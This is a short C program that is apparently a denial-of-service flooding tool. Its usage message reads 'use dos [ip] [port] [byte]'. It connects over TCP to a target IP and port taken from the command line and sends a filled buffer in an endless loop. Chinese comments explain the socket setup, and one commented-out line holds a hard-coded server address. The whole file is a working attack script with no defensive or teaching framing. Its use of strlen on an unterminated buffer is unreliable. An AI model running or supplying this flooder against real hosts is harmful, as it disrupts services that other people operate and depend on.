#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[])
{
		if (argc != 4){
				printf("use dos [ip] [port] [byte]\n");
				return 0;
		}
		int conn;
		int sockfd;
		struct sockaddr_in remote_addr; //服务器端网络地址结构体  
		char buf[atoi(argv[3])];  //数据传送的缓冲区  
		memset(&remote_addr,0,sizeof(remote_addr)); //数据初始化--清零  
		remote_addr.sin_family=AF_INET; //设置为IP通信  
		//remote_addr.sin_addr.s_addr=inet_addr("162.243.158.143");//服务器IP地址 
		inet_aton(argv[1], &remote_addr.sin_addr.s_addr);		
		remote_addr.sin_port=htons(atoi(argv[2])); //服务器端口号 
		if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0){
				perror("socket");
				return 1;
		}
		if(connect(sockfd,(struct sockaddr *)&remote_addr,sizeof(struct sockaddr))<0){  
				perror("connect");  
				return 1;  
		}  
		printf("Connected to server\n");
		memset(buf,49,sizeof(buf));
		printf("Ready to dos %s:%d \n", argv[1], atoi(argv[2]));
		while(1)
		{
				send(sockfd,buf,strlen(buf),0);
		}
		return 0;
}

